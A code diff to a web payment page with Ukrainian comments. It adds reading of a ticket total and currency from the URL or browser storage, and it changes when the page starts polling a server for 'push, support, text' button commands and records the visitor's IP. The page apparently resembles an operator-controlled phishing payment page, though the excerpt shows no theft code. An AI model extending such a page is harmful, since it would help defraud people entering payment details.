@@ -215,7 +215,7 @@
     </style>
 </head>
 <body>
-    <div class="payment-card">
+    <div class="payment-card" id="payment-card-main">
         <div class="bank-icon">
             <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/></svg>
         </div>
@@ -314,6 +314,22 @@
             console.error('Помилка при зверненні до сервера:', error);
         }
     };
+
+    // --- Витягуємо total і currency з URL ---
+    function getTotalAndCurrency() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const totalRaw = urlParams.get('total') || sessionStorage.getItem('ticket_total');
+        const currencyRaw = urlParams.get('currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
+        if (totalRaw) {
+            const match = totalRaw.match(/\d+[\.,]?\d*/);
+            const totalNum = match ? match[0].replace(',', '.') : '';
+            return { total: totalNum, currency: currencyRaw };
+        }
+        // fallback: price/currency
+        let price = localStorage.getItem('ticket_price') || sessionStorage.getItem('ticket_price');
+        let currency = localStorage.getItem('ticket_currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
+        return { total: price, currency };
+    }
 
     // --- Універсальний POLLING для всіх кнопок (push, support, text) ---
     let supportTabOpened = false;
@@ -452,11 +468,14 @@
         setTimeout(pollAllButtons, 2000);
     }
     
-    // Стартуємо polling тільки після визначення userIP
+    // Стартуємо polling одразу, а не чекаємо userIP
+    startUniversalPolling();
+    
+    // Оновлюємо userIP коли він стає доступним
     getUserIP(function(ip) {
         userIP = ip;
-        startUniversalPolling();
     });
+
     // Зчитування параметрів з URL
     function getQueryParam(name) {
         const url = new URL(window.location.href);
